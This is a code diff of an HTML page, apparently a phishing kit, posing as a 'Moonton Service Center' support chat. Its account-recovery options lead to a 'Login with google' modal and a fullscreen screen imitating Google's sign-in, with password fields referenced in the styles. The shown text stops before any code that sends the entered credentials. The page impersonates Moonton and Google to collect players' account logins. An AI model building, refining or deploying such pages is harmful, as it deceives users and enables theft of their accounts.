@@ -6,120 +6,55 @@
     <title>Moonton Service Center</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Impor Montserrat */
-        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap');
-
-        /* Global box-sizing reset untuk membantu tata letak */
-        *, *::before, *::after {
-            box-sizing: border-box;
-        }
-
-        /* --- TEMA VARIAN (HANYA UNTUK REGISTRATION VIEW) --- */
-        .theme-light {
-            --bg-page: #ffffff;
-            --text-primary: #1f2937;
-            --input-border: #d1d5db;
-        }
-
-        @media (prefers-color-scheme: dark) {
-            .theme-dark {
-                --bg-page: #121212;
-                --text-primary: #9ca3af;
-                --input-border: #4b5563;
-            }
-        }
-        /* --- END TEMA VARIAN --- */
-
-
-        body {
-            font-family: 'Montserrat', sans-serif;
-            margin: 0;
-            /* KRUSIAL: background-color body disetel ke abu-abu terang */
-            background-color: #e5e7eb;
-            display: flex;
-            align-items: center; /* Center vertically on full screen */
-            justify-content: center; /* Center horizontally */
-            /* KRUSIAL: Pastikan body mengambil tinggi penuh viewport */
-            min-height: 100vh; 
-            height: 100vh; /* Tambahkan height 100vh */
-            padding: 0 !important;
-            width: 100%;
-        }
-        
-        /* [KRUSIAL] Kontainer utama (#chatView) */
-        #chatView {
-            width: 100%;
-            max-width: 600px;
-            height: 90vh;
-            max-height: 800px;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -4px rgba(0, 0, 0, 0.1);
-            background-color: #ffffff;
-            border-radius: 0.75rem;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden; /* Kontainer utama harus overflow hidden */
-            position: relative; 
-            z-index: 10;
-        }
-
-        /* Chat Header Style */
-        #chatView header {
-            flex-shrink: 0;
-            background-color: #ffffff;
-            color: #1f2937; 
-        }
-
-        /* Chat Messages Area (Main Content Scrollable) */
-        #chatArea {
-            flex-grow: 1;
-            /* KRUSIAL: Ini adalah area yang bisa digulir */
-            overflow-y: auto; 
-            background-color: #f8f8f8; 
-            padding: 1rem;
-            width: 100%;
-            /* KRUSIAL: Memastikan pesan berbaris vertikal */
-            display: flex;
-            flex-direction: column;
-        }
-        
-        /* Chat Bubble Wrapper (div dengan class="flex justify-...") */
-        #chatArea > div.flex {
-            /* Pastikan elemen baris memiliki margin bottom untuk spasi */
-            margin-bottom: 0.5rem;
-            /* KRUSIAL: Reset margin pada child terakhir untuk menghindari double margin di akhir scroll */
-            padding-top: 0;
-            padding-bottom: 0;
-        }
-
-        /* Chat Bubble Styles */
+        /* Hanya menyimpan style yang esensial untuk fungsi */
         .message-bubble {
             max-width: 90%; 
             border-radius: 0.75rem;
             padding: 0.5rem 1rem;
             word-wrap: break-word;
-            transition: opacity 0.3s ease-out, transform 0.3s ease-out;
-            display: inline-block; /* Memungkinkan bubble mengikuti konten */
         }
         .bot-message {
             background-color: #ffffff;
-            border-bottom-left-radius: 0.125rem;
-            animation: fadeInSlideUp 0.3s ease-out forwards;
-            opacity: 0;
-            transform: translateY(10px);
+            border: 1px solid #e5e7eb;
         }
         .user-message {
             background-color: #2563eb;
             color: white;
-            border-bottom-right-radius: 0.125rem;
-        }
-        /* Keyframe untuk animasi pesan bot */
-        @keyframes fadeInSlideUp {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
         
-        /* ... Sisa CSS lainnya (Loader, Font, Registration View) ... */
+        /* Floating label untuk form inline */
+        .floating-label-group {
+            position: relative;
+            margin-top: 1.0rem;
+            border: 2px solid #d1d5db;
+            border-radius: 0.5rem;
+        }
+        .floating-label-group input {
+            padding: 0.6rem 1rem 0.4rem 1rem;
+            border: none;
+            width: 100%;
+            background-color: transparent;
+        }
+        .floating-label {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+            transition: all 0.2s ease;
+            color: #9ca3af;
+            background-color: white;
+            padding: 0 0.25rem;
+        }
+        .floating-label-group input:focus + .floating-label,
+        .floating-label-group input:not(:placeholder-shown) + .floating-label {
+            top: -0.5rem;
+            transform: translateY(0);
+            font-size: 0.65rem;
+            color: #3b82f6;
+        }
         
+        /* Loading dan modal */
         .loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #2563eb;
@@ -132,550 +67,12 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .ahrastore-font {
-            font-family: 'Montserrat', sans-serif;
-            letter-spacing: normal;
-            text-transform: none; 
-            font-weight: 700;
-            line-height: 1.1; 
-        }
-        .moonton-logo-icon {
-            display: inline-block;
-            width: 32px;
-            height: 32px;
-            position: relative;
-            margin-right: auto;
-        }
-        .input-group {
-            position: relative;
-        }
-        .input-group input {
-            padding-right: 2.5rem;
-        }
-        .password-toggle {
-            display: none;
-        }
-        /* Gaya ini diabaikan di luar registration-view */
-        .bottom-right-button {
-            display: flex;
-            justify-content: flex-end;
-            padding-top: 1.5rem;
-        }
         
-        /* ********************************************** */
-        /* REVISI: INLINE ERROR */
-        /* ********************************************** */
-        .inline-error {
-            color: #FF7081;
-            font-size: 0.875rem;
-            margin-top: 0.5rem;
-            
-            /* KRUSIAL: Pusatkan error dan beri padding-left agar sejajar dengan teks input */
-            max-width: 450px; 
-            margin: 0 auto;
-            padding-left: 0.75rem;
-            
-            width: 100%;
-            text-align: left;
-            font-weight: 400;
-        }
-
-        /* ************************************************* */
-        /* FLOATING LABEL STYLE (Chat Inline Form - REVISI UKURAN & FONT) */
-        
-        /* Base group style */
-        .floating-label-group {
-            position: relative;
-            margin-top: 1.0rem;
-        }
-
-        /* Base input style */
-        .floating-label-group input {
-             padding: 0.6rem 1rem 0.4rem 1rem;
-             border-width: 0 !important; 
-             z-index: 5;
-             background-color: transparent !important; 
-             box-shadow: none !important;
-        }
-
-        /* Base label style (Hidden until focused/filled) */
-        .floating-label {
-            position: absolute;
-            left: 1rem;
-            top: 50%;
-            transform: translateY(-50%);
-            pointer-events: none;
-            transition: all 0.2s ease;
-            color: #9ca3af;
-            z-index: 10;
-        }
-        
-        /* Floating label when focused/filled */
-        .floating-label-group input:focus + .floating-label,
-        .floating-label-group input:not(:placeholder-shown) + .floating-label {
-            top: -0.5rem;
-            transform: translateY(0);
-            font-size: 0.65rem;
-            padding: 0 0.5rem; 
-            left: 0.75rem;
-            color: #3b82f6;
-        }
-        
-        /* REVISI: Mengatur ukuran font default untuk chat box */
-        #chatArea .floating-label-group {
-             font-size: 0.9rem;
-             border: 2px solid #d1d5db; 
-             border-radius: 0.5rem;
-             padding: 0;
-             box-shadow: 0 0 0 0 transparent;
-             transition: box-shadow 0.2s ease-in-out;
-             max-width: none; 
-        }
-        #chatArea .floating-label-group input {
-             background-color: #ffffff !important;
-        }
-        /* PERBAIKAN BUG: Menggunakan white background untuk label di chat bubble */
-        #chatArea .floating-label-group input:focus + .floating-label,
-        #chatArea .floating-label-group input:not(:placeholder-shown) + .floating-label {
-            background-color: white !important; 
-            box-shadow: none !important; 
-        }
-        /* NEW: Efek outline biru saat fokus */
-        #chatArea .floating-label-group input:focus-within {
-            box-shadow: 0 0 0 2px #2563eb !important;
-            border-color: #2563eb !important;
-        }
-        /* Mengurangi padding vertikal tombol KIRIM */
-        #inlineForm button[type="submit"] {
-            padding-top: 0.5rem;
-            padding-bottom: 0.5rem;
-            font-size: 0.875rem;
-        }
-        /* Mengurangi padding card form */
-        #inlineForm {
-            padding: 1rem !important;
-        }
-
-
-        /* ************************************************* */
-        /* LABEL DI ATAS INPUT UNTUK REGISTRATION VIEW (FLOATING LABEL CUT-OUT) */
-        
-        .registration-view .floating-label-group {
-            position: relative; 
-            border: none; 
-            border-radius: 0.5rem;
-            margin-top: 2.2rem; 
-            padding: 0;
-            width: 100%;
-            max-width: none;
-        }
-
-        /* REVISI: Efek Outline Fokus pada Group */
-        .registration-view .floating-label-group.focused .input-wrapper {
-             border-color: #3b82f6 !important; 
-             box-shadow: 0 0 0 2px #2563eb !important; 
-        }
-        
-        /* KRUSIAL PERBAIKAN: Tambahkan Max-Width 450px di Input Wrapper untuk sejajar dengan deskripsi */
-        .registration-view .input-wrapper {
-             width: 100%;
-             max-width: 450px; /* KRUSIAL: Membatasi lebar input */
-             margin: 0 auto;
-             border: 2px solid var(--input-border);
-             border-radius: 0.5rem;
-             position: relative;
-             z-index: 10;
-        }
-        /* Mengembalikan max-width 450px hanya untuk tombol dan checkbox di step 2/3 agar tetap centered di layar lebar */
-        .registration-step-content .bottom-right-button {
-             max-width: 450px;
-             margin-left: auto;
-             margin-right: auto;
-        }
-        .registration-step-content .show-password-checkbox {
-             max-width: 450px;
-        }
-        
-        .registration-view .floating-label-group input {
-            /* Pastikan padding-left 1rem */
-            padding: 0.8rem 1rem !important; 
-            border: none !important; 
-            width: 100%; 
-            background-color: var(--bg-page) !important;
-            color: var(--text-primary) !important;
-            z-index: 20; 
-            position: relative;
-        }
-        .registration-view .floating-label-group input:focus {
-             box-shadow: none !important; 
-        }
-
-
-        /* Label di Registration View sekarang menjadi Floating */
-        .registration-view .floating-label-group label.floating-label {
-            position: absolute;
-            left: 1rem; /* Posisi awal sama dengan padding-left input (16px) */
-            top: 50%;
-            transform: translateY(-50%);
-            
-            font-size: 1rem;
-            font-weight: 400;
-            color: #9ca3af;
-            display: inline-block;
-            transition: all 0.2s ease;
-            z-index: 30;
-            pointer-events: none;
-            
-            /* Background yang memotong garis input */
-            background-color: var(--bg-page); 
-            line-height: 1;
-            /* KRUSIAL: Padding horizontal minimal untuk potongan */
-            padding: 0 0.25rem; 
-            white-space: nowrap;
-            width: auto;
-        }
-        
-        /* Floating label ketika fokus atau sudah terisi (Memotong Garis) */
-        .registration-view .floating-label-group.focused label.floating-label,
-        .registration-view .floating-label-group.filled label.floating-label {
-             top: 0; /* KRUSIAL: Posisikan label di atas bingkai */
-             transform: translateY(-50%); 
-             font-size: 0.875rem;
-             color: #3b82f6;
-             
-             background-color: var(--bg-page); 
-             z-index: 40;
-             /* KRUSIAL REVISI: Posisikan di 0.75rem (12px) untuk presisi */
-             left: 0.75rem; 
-             /* Padding untuk potongan */
-             padding: 0 0.25rem;
-        }
-        
-        /* NEW: Class untuk input container - DIHAPUS DARI ELEMEN INPUT UNTUK MEMBUAT RATA KIRI */
-        .centered-input-container {
-             display: flex;
-             flex-direction: column;
-             align-items: center;
-             width: 100%;
-             margin-top: 0;
-        }
-
-        /* ************************************************* */
-        /* REVISI: HEADER REGISTRATION VIEW UNTUK TAMPILAN MIRIP GOOGLE LOGIN */
-        .registration-view header {
-            background-color: transparent !important;
-            border-bottom: none !important;
-            box-shadow: none !important;
-            
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 1.5rem 1.5rem 0rem 1.5rem;
-            height: auto;
-        }
-
-        /* Styling untuk teks "Google" */
-        .registration-view .google-text {
-            font-size: 1.875rem;
-            font-weight: 500; 
-            color: var(--text-primary);
-            margin-bottom: 0.5rem;
-        }
-
-        /* Styling untuk grup logo dan nama Moonton */
-        .registration-view .moonton-brand {
-            display: flex;
-            align-items: center;
-            margin-bottom: 1.5rem;
-        }
-        .registration-view .moonton-brand img {
-            width: 32px;
-            height: 32px;
-            margin-right: 0.5rem;
-        }
-        .registration-view .moonton-brand h2 {
-            font-size: 1.125rem;
-            font-weight: 500;
-            color: var(--text-primary);
-        }
-
-        /* Styling untuk deskripsi di bawah logo */
-        .registration-view .login-description {
-            font-size: 0.95rem; 
-            /* KRUSIAL: Ubah text-align menjadi KIRI */
-            text-align: left;
-            margin-bottom: 1.5rem;
-            color: var(--text-primary);
-            max-width: 450px;
-            line-height: 1.4;
-            font-weight: 400;
-            align-self: center;
-            width: 100%;
-            
-            /* KRUSIAL: Membuat deskripsi rata kiri dalam kontainer centernya */
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .registration-view .login-description span {
-            display: block; 
-            width: 100%; 
-            /* KRUSIAL: Teks di dalam span harus rata kiri */
-            text-align: left;
-        }
-        .registration-view .login-description .link {
-            color: #3b82f6; 
-            text-decoration: none;
-            cursor: pointer;
-            font-weight: 400;
-            /* KRUSIAL: Link harus rata KIRI */
-            text-align: left;
-            display: block;
-            width: 100%;
-        }
-
-        /* Menyembunyikan elemen header lama yang tidak digunakan */
-        .registration-view header .back-button,
-        .registration-view header #registrationTitle,
-        .registration-view header .close-button {
+        .hidden {
             display: none !important;
         }
-
-        /* Menyesuaikan main content agar tidak terlalu banyak padding atas */
-        .registration-view main {
-            padding-top: 0;
-            /* KRUSIAL: Tambahkan padding bawah di main untuk jarak dari bezel */
-            padding-bottom: 2rem; 
-            padding-left: 0;
-            padding-right: 0;
-            width: 100%;
-            
-            /* KRUSIAL: Tambahkan Flexbox di sini untuk mengelola konten langkah */
-            display: flex;
-            flex-direction: column;
-        }
         
-        /* ************************************************* */
-        /* TOMBOL SELANJUTNYA KE POJOK KANAN BAWAH (REVISI FINAL) */
-        /* ************************************************* */
-        .registration-step-content {
-            display: flex;
-            flex-direction: column;
-            flex-grow: 1;
-            /* KRUSIAL: Hapus padding horizontal/bawah di sini, kontrol lebar di dalam input-wrapper */
-            padding: 0; 
-            width: 100%;
-        }
-        
-        .registration-step-inputs {
-            flex-grow: 1; /* KRUSIAL: Ambil semua sisa ruang di atas tombol */
-            overflow-y: visible; 
-            /* KRUSIAL: Tambahkan padding atas dan margin di bawah input groups */
-            padding: 1rem 0 10px 0;
-        }
-        
-        .bottom-right-button {
-            margin-top: auto; /* KRUSIAL: Mendorong tombol ke bagian bawah */
-            padding-top: 0.5rem; 
-            flex-shrink: 0;
-            width: 100%;
-            max-width: 450px; /* KRUSIAL: Membatasi tombol agar rata dengan input centered */
-            margin-left: auto;
-            margin-right: auto;
-            display: flex; /* KRUSIAL: Menjadikannya flex container */
-            justify-content: flex-end; /* KRUSIAL: Mendorong tombol ke kanan */
-            padding-bottom: 0; /* Hapus padding bawah jika ada */
-        }
-        /* ************************************************* */
-        /* Gaya Checkbox untuk Tampilkan Sandi */
-        .show-password-checkbox {
-            display: flex;
-            align-items: center; 
-            margin-top: 1rem;
-            margin-left: 0;
-            width: 100%; 
-            max-width: 450px;
-            padding-left: 0;
-            margin: 1rem auto 0 auto;
-        }
-        .show-password-checkbox input[type="checkbox"] {
-            margin-right: 0.75rem; 
-            width: 18px;
-            height: 18px;
-            border: 1px solid var(--text-primary);
-            accent-color: #3b82f6;
-            cursor: pointer;
-            flex-shrink: 0; 
-            margin-top: 0;
-            margin-bottom: 0;
-            line-height: 1.2;
-        }
-        .show-password-checkbox label {
-            font-weight: 400;
-            font-size: 0.95rem;
-            color: var(--text-primary);
-            white-space: nowrap; 
-            margin-top: 0;
-            margin-bottom: 0;
-            line-height: 1.2;
-        }
-        /* ************************************************* */
-
-
-        /* ************************************************* */
-        /* TEMA */
-        .theme-light {
-            /* Tema Light untuk halaman registrasi */
-            --bg-page: #ffffff;
-            --bg-card: #ffffff;
-            --text-primary: #1f2937;
-            --input-bg: #ffffff;
-            --input-border: #d1d5db;
-            --label-bg: #ffffff;
-            --header-bg: #ffffff;
-            --header-border: #e5e7eb;
-            --modal-overlay: rgba(0, 0, 0, 0.75);
-            /* Warna untuk Loading Spinner */
-            --spinner-color: #2563eb;
-            --spinner-trail-color: #f3f3f3;
-            /* Warna untuk Panah Loading */
-            --arrow-color: #2563eb; 
-            --loading-text-color: #1f2937;
-        }
-
-        @media (prefers-color-scheme: dark) {
-            .theme-dark {
-                /* Tema Dark untuk halaman registrasi */
-                --bg-page: #121212;
-                --bg-card: #1f1f1f;
-                --text-primary: #f3f4f6;
-                --input-bg: #121212;
-                --input-border: #4b5563;
-                --label-bg: #121212;
-                --header-bg: #1f1f1f;
-                --header-border: #374151;
-                --modal-overlay: rgba(255, 255, 255, 0.1);
-                --spinner-color: #3b82f6;
-                --spinner-trail-color: #4b5563;
-                --arrow-color: #3b82f6;
-                --loading-text-color: #f3f4f6;
-            }
-        }
-        /* ************************************************* */
-
-        /* Kontainer Pendaftaran (Fullscreen) */
-        .registration-view {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 50;
-            
-            /* Latar belakang halaman pendaftaran yang menyesuaikan tema */
-            background-color: var(--bg-page);
-            color: var(--text-primary);
-            display: flex; 
-            flex-direction: column;
-        }
-        
-        /* State Transisi (Diubah ke instan) */
-        .registration-view.view-hidden {
-            display: none !important; 
-        }
-        .registration-view.view-visible {
-            display: flex; 
-            opacity: 1;
-            transform: translateX(0);
-        }
-        
-        /* Styling Input dan Teks di Registration View */
-        /* HEADER DI REGISTRATION VIEW */
-        .registration-view header {
-             background-color: transparent !important;
-             border-bottom: none !important;
-             box-shadow: none !important;
-             display: flex !important;
-             align-items: center;
-             height: auto;
-        }
-        
-        /* Styling untuk Step 2 dan 3 agar memanjang vertikal */
-        .registration-step-content {
-            display: flex;
-            flex-direction: column;
-            flex-grow: 1;
-            padding: 0 1.5rem;
-        }
-        .registration-step-inputs {
-            flex-grow: 1;
-            overflow-y: auto;
-            padding: 1rem 0 10px 0;
-        }
-        
-        /* PERUBAHAN: Styling Loader Full Screen */
-        .full-screen-loader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: var(--bg-page); 
-            color: var(--loading-text-color);
-            z-index: 50;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            font-size: 1rem;
-            font-weight: 600;
-            opacity: 1 !important;
-        }
-        
-        /* ****************************************************** */
-        /* NEW: CUSTOM LOADING ANIMATION STYLES */
-        /* ****************************************************** */
-        .custom-loader-wrapper {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .loading-circle-spinner {
-            border: 16px solid var(--spinner-trail-color);
-            border-top: 16px solid var(--spinner-color);
-            border-radius: 50%;
-            width: 160px;
-            height: 160px;
-            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-            margin-top: 0; 
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .loading-text {
-            font-size: 1.25rem;
-            font-weight: 500;
-            margin-bottom: 3rem; 
-            color: var(--loading-text-color);
-        }
-
-        /* TYPING INDICATOR (TITIK TIGA) STYLES - TIDAK DIHAPUS */
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% {
-                transform: translateY(0);
-            }
-            40% {
-                transform: translateY(-6px);
-            }
-            60% {
-                transform: translateY(-3px);
-            }
-        }
+        /* Typing indicator */
         .dot {
             display: inline-block;
             width: 6px;
@@ -685,1074 +82,497 @@
             margin: 0 1px;
             animation: bounce 1.8s infinite;
         }
-        .dot:nth-child(2) {
-            animation-delay: 0.3s;
-        }
-        .dot:nth-child(3) {
-            animation-delay: 0.6s;
-        }
-        /* Gaya untuk tombol di pojok kanan bawah modal */
-        .bottom-right-button {
-            display: flex;
-            justify-content: flex-end;
-            padding-top: 1.5rem;
-        }
-        
-        /* Selection Modal */
-        #selectionModal {
-             background-color: var(--modal-overlay);
-        }
-        #selectionModalContent {
-             background-color: var(--bg-card);
-             color: var(--text-primary);
-        }
-        #selectionModalContent .p-5.border-b {
-             background-color: var(--header-bg) !important;
-             border-color: var(--header-border) !important;
-        }
-        #selectionModalContent h3,
-        #selectionModalContent p {
-            color: var(--text-primary);
-        }
-        #selectionModalContent .text-gray-500 {
-            color: var(--text-primary); 
-            opacity: 0.7;
-        }
-
-        #selectionModalContent button.w-full {
-            color: var(--text-primary); 
-            background-color: var(--bg-card); 
-            border-color: var(--header-border); 
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-6px); }
+            60% { transform: translateY(-3px); }
         }
     </style>
 </head>
-<body class="flex items-center justify-center p-4 sm:p-6" onload="initializeFirebase()">
+<body style="background-color: #e5e7eb; font-family: sans-serif; margin: 0; padding: 20px; min-height: 100vh;">
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-
-        // EXPOSE FIREBASE FUNCTIONS TO WINDOW SCOPE
-        window.initializeApp = initializeApp;
-        window.getAuth = getAuth;
-        window.signInAnonymously = signInAnonymously;
-        window.signInWithCustomToken = signInWithCustomToken;
-        window.onAuthStateChanged = onAuthStateChanged;
-        window.getFirestore = getFirestore;
-        window.setLogLevel = setLogLevel;
-    </script>
-    <div id="chatView" class="chat-container w-full rounded-xl overflow-hidden" style="display: flex;">
-        <header class="flex items-center justify-between bg-white p-4 border-b border-gray-200 shadow-sm">
-            <div class="flex items-center space-x-2">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
-                </svg>
-                
-                <img src="https://i.postimg.cc/brSXG9rd/moonton.png" 
-                    alt="Moonton Logo" 
-                    class="w-5 h-5 object-contain"
-                    onerror="this.onerror=null; this.src='https://placehold.co/20x20/FFD700/000?text=M'"
-                />
-                <span class="text-md font-semibold text-gray-800 ahrastore-font" style="letter-spacing: normal;">
-                    Moonton Technology Co.
-                </span>
-            </div>
-            
-            <div class="flex items-center space-x-1">
+    <!-- Area Chat Utama -->
+    <div id="chatArea" style="max-width: 600px; margin: 0 auto; background-color: #f8f8f8; border-radius: 12px; padding: 16px; min-height: 80vh;">
+        <!-- Pesan akan ditambahkan di sini secara dinamis -->
+        <div class="flex justify-start">
+            <div class="message-bubble bot-message">
+                <p style="font-weight: bold; font-size: 0.875rem; margin-bottom: 4px; color: #2563eb;">Moonton Technology Co.</p>
+                <p>Hey, hero! Welcome to the Moonton customer service center.</p>
+                <p style="margin-top: 8px;">Please select the topic you would like to chat about from the options below:</p>
+                <div style="margin-top: 8px;">
+                    <button style="color: #2563eb; text-decoration: underline; display: block; text-align: left; background: none; border: none; cursor: pointer; padding: 2px 0;" onclick="handleCommand('Cancel change email')">
+                        · Cancel change email
+                    </button>
+                    <button style="color: #2563eb; text-decoration: underline; display: block; text-align: left; background: none; border: none; cursor: pointer; padding: 2px 0;" onclick="handleCommand('Account Recovery')">
+                        · Account Recovery
+                    </button>
+                    <button style="color: #2563eb; text-decoration: underline; display: block; text-align: left; background: none; border: none; cursor: pointer; padding: 2px 0;" onclick="handleCommand('Bug Reports')">
+                        · Bug Reports
+                    </button>
                 </div>
-        </header>
-
-        <div id="statusInfo" class="text-xs text-center p-1 bg-yellow-100 text-yellow-700 hidden">
-            </div>
-
-        <main id="chatArea" class="flex-grow p-4 space-y-4 overflow-y-auto" style="background-color: #f8f8f8;">
-            <div class="flex justify-start">
-                <div class="message-bubble bot-message text-gray-800">
-                    <p class="font-bold text-sm mb-1 text-blue-600">Moonton Technology Co.</p>
-                    <!-- START TEXT CHANGE -->
-                    <p>Hey, hero! Welcome to the Moonton customer service center.</p>
-                    <p class="mt-2">Please select the topic you would like to chat about from the options below:</p>
-                    <!-- END TEXT CHANGE -->
-                    <div class="mt-2 space-y-1">
-                        <!-- UPDATING onclick ARGUMENT TO MATCH VISIBLE TEXT -->
-                        <button class="text-blue-600 hover:underline block text-left" onclick="handleCommand('Cancel change email')">
-                            · Cancel change email
-                        </button>
-                        <button class="text-blue-600 hover:underline block text-left" onclick="handleCommand('Account Recovery')">
-                            · Account Recovery
-                        </button>
-                        <button class="text-blue-600 hover:underline block text-left" onclick="handleCommand('Bug Reports')">
-                            · Bug Reports
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <div class="p-4 bg-white border-t border-gray-200">
-            <div class="flex items-center border border-gray-300 rounded-xl bg-gray-50 p-2 shadow-inner">
-                <input type="text" placeholder="Please select one of the commands above..." class="flex-grow bg-transparent focus:outline-none px-2 text-gray-700" id="userInput" disabled>
-                <button class="text-blue-600 hover:text-blue-800 p-1" disabled>
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-                    </svg>
-                </button>
             </div>
         </div>
     </div>
 
-    <div id="fullScreenLoader" class="full-screen-loader hidden" style="opacity: 1;">
-        <div class="custom-loader-wrapper">
-            <p class="loading-text">Please wait...</p>
-            
-            <div class="loading-circle-spinner"></div>
-        </div>
-    </div>
-    
-    <div id="selectionModal" class="fixed inset-0 bg-black bg-opacity-75 hidden flex items-center justify-center p-4 z-40 modal-transition opacity-0" onclick="closeSelectionModal(event)">
-        <div id="selectionModalContent" class="rounded-xl overflow-hidden shadow-2xl w-full max-w-sm selection-modal-content" onclick="event.stopPropagation()">
-            
-            <div class="p-5 border-b flex items-center justify-between">
-                <div class="flex items-center space-x-2">
-                    <img src="https://i.postimg.cc/brSXG9rd/moonton.png" 
-                                alt="Moonton Logo" 
-                                class="w-8 h-8 object-contain"/>
-                    <h2 class="text-xl font-bold ahrastore-font">Moonton Technology Co.</h2>
+    <!-- Modal Login (Google) -->
+    <div id="selectionModal" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.75); display: flex; align-items: center; justify-content: center; z-index: 50;">
+        <div style="background-color: white; border-radius: 12px; max-width: 400px; width: 90%; overflow: hidden;">
+            <div style="padding: 20px; border-bottom: 1px solid #e5e7eb; display: flex; align-items: center; justify-content: space-between;">
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <img src="https://i.postimg.cc/brSXG9rd/moonton.png" alt="Moonton Logo" style="width: 32px; height: 32px;">
+                    <h2 style="font-weight: bold; font-size: 1.25rem;">Moonton Technology Co.</h2>
                 </div>
-                <button class="text-gray-500 hover:text-gray-900 transition duration-150 p-1 rounded-full hover:bg-gray-100" onclick="closeSelectionModal()">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                        
-                    </svg>
+                <button onclick="closeSelectionModal()" style="color: #6b7280; background: none; border: none; cursor: pointer; padding: 4px; border-radius: 50%;">
+                    ✕
                 </button>
             </div>
-
-            <div class="p-6 space-y-4">
-                <h3 class="text-lg font-semibold text-center">Login.</h3>
-                <p class="text-sm text-center">Select the login option to continue.</p>
-
-                <button class="w-full flex items-center justify-center p-3 border-2 border-gray-400 rounded-xl font-semibold transition duration-150" onclick="startRegistrationFlow(2)">
-                    <img src="https://i.postimg.cc/tgqHry1n/google.png" 
-                                alt="Google Logo" 
-                                class="mr-3 h-6 w-6 object-contain"
-                                onerror="this.onerror=null; this.src='https://placehold.co/24x24/FFFFFF/4285F4?text=G'"
-                    />
+            <div style="padding: 24px; text-align: center;">
+                <h3 style="font-size: 1.125rem; font-weight: 600;">Login.</h3>
+                <p style="font-size: 0.875rem; margin-top: 4px;">Select the login option to continue.</p>
+                <button onclick="startRegistrationFlow(2)" style="width: 100%; display: flex; align-items: center; justify-content: center; padding: 12px; border: 2px solid #d1d5db; border-radius: 12px; font-weight: 600; margin-top: 16px; cursor: pointer; background: white;">
+                    <img src="https://i.postimg.cc/tgqHry1n/google.png" alt="Google Logo" style="width: 24px; height: 24px; margin-right: 12px;">
                     Login with google
                 </button>
-                
-                <p class="text-sm text-center mt-2 opacity-70">
+                <p style="font-size: 0.75rem; color: #6b7280; margin-top: 16px;">
                     I have read and agree to the terms of service and privacy policy of Moonton Technology Co.
                 </p>
             </div>
-
         </div>
     </div>
-    <div id="registrationView" class="registration-view view-hidden theme-light" style="display: none;">
-        
-        <header class="flex-shrink-0">
-            
-            <h3 class="google-text">Google</h3>
-            
-            <div class="moonton-brand">
-                <img src="https://i.postimg.cc/brSXG9rd/moonton.png" 
-                                alt="Moonton Logo" 
-                                class="w-8 h-8 object-contain"
-                                onerror="this.onerror=null; this.src='https://placehold.co/32x32/FFD700/000?text=M'"
-                />
-                <h2 class="ahrastore-font">Moonton Technology Co.</h2>
+
+    <!-- Registration View (Fullscreen) -->
+    <div id="registrationView" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: white; z-index: 60; display: flex; flex-direction: column;">
+        <header style="padding: 24px; text-align: center;">
+            <h3 style="font-size: 1.875rem; font-weight: 500; margin-bottom: 8px;">Google</h3>
+            <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 24px;">
+                <img src="https://i.postimg.cc/brSXG9rd/moonton.png" alt="Moonton Logo" style="width: 32px; height: 32px;">
+                <h2 style="font-weight: 500; font-size: 1.125rem;">Moonton Technology Co.</h2>
             </div>
-            
-            <div class="login-description">
-                <span style="font-weight: 400; display: block; width: 100%; text-align: center;">Use your Google Account.</span>
-                <span style="font-weight: 400; display: block; width: 100%; text-align: center;">The account will be added to this device and available to Moonton Technology Co.</span>
-                <span class="link">learn more about how to use your account.</span>
+            <div style="max-width: 450px; margin: 0 auto; text-align: left; font-size: 0.95rem; line-height: 1.4;">
+                <span>Use your Google Account.</span><br>
+                <span>The account will be added to this device and available to Moonton Technology Co.</span><br>
+                <a href="#" style="color: #3b82f6; text-decoration: none;">learn more about how to use your account.</a>
             </div>
-            
-            <button class="back-button absolute left-4 top-4 text-gray-500 hover:text-gray-900 p-1 rounded-full transition duration-150" onclick="closeRegistrationView()" style="display: none;">
